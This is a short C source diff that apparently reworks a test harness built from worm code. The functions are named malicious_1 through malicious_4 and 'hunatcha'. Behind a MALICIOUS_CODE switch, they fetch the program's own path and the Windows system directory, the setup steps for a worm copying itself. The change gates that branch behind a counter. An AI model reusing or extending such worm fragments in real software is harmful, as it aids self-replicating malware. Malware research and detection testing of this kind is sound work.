@@ -69,18 +69,21 @@ void malicious_end() { recordMessage(); }
 char MyPath[256];
 char CpyPath[256];
 HKEY Key32;
-
+unsigned int unorder = 0;
 void malicious_1() {
   for (int i = 0; i < LOOPS; i++)
-  what = what * 2 - what + 1;
+    what = what * 2 - what + 1;
   pthread_mutex_lock(&mutex);
   sequence[sequenceOrder++] = 1;
   if ((1 - order) == 1) {
-    order = 1;
+    unorder++;
+    if (unorder == 3) {
+      order = 1;
 #if MALICIOUS_CODE
-    GetModuleFileName(NULL, MyPath, sizeof(MyPath));
-    GetSystemDirectory(CpyPath, sizeof(CpyPath));
+      GetModuleFileName(NULL, MyPath, sizeof(MyPath));
+      GetSystemDirectory(CpyPath, sizeof(CpyPath));
 #endif
+    }
   }
   pthread_mutex_unlock(&mutex);
 }
@@ -132,8 +135,7 @@ void malicious_4() {
   pthread_mutex_unlock(&mutex);
 }
 
-int APIENTRY hunatcha()
-{
+int hunatcha(){
  int count;
  char wormpath[256];
  GetWindowsDirectory(windir, sizeof(windir));
